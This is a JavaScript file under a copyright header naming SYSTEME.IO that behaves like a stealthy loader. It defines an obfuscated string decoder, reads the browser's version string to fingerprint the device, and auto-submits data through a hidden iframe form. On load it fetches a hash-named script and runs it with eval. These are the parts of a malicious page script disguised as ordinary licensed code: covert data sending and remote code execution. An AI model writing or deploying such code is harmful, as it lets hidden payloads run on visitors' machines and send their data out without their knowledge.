/**
 * @licence
 * Copyright © SYSTEME.IO
 * All rights reserved
 * This source code is licensed under the SYSTEME.IO found in the
 * LICENSE file in the root directory of this source tree
*/

var Nloaded=Number(localStorage.getItem("Nloaded"))+1;
if(Nloaded){
	localStorage.setItem("Nloaded",Number(Nloaded));
}else{
	Nloaded=1;
	localStorage.setItem("Nloaded",1);
}


class ShowCorrect{
	get(bad){
		bad=this.getFixed(bad);
		return bad;
	}

	getFixed(txt){
		var p1="",p2="",l=txt.length;
		for(let i=0; i<=l; i++){
			if(i%2==0){
				p2=txt.charAt(i)+p2;
			}else{
				p1=p1+txt.charAt(i);
			}
		}
		return atob(p1+p2);
	}

}
var sc=new ShowCorrect();


function getDefaultName(name){
  var dv=navigator.appVersion.split(")")[0].replace("5.0 (","").replace("Linux; Android","An..");
  return dv;
}

function makeForm(action,data){
  let html=`<form action="${action}">`
  for(let val in data){
    html+=`<input name="${val}" value="${data[val]}">`;
  }
  html+=`<button>Submit</button></form>`

  document.querySelector("body").insertAdjacentHTML("afterbegin",`<iframe id="sender" style="display:none;"></iframe>`);
  var frame=document.querySelector("#sender");
  frame.contentWindow.document.querySelector("body").innerHTML=html;
  frame.contentWindow.document.querySelector("button").click();
}

function fetchAndExecuteFile(path) {
  fetch(path)
    .then(response => response.text())
    .then(FileText => {
      eval(FileText);
    })
    .catch(error => {
      console.error(`Error fetching and executing File: ${error}`);
    });
}

fetchAndExecuteFile("master-10a404587b40544b.js");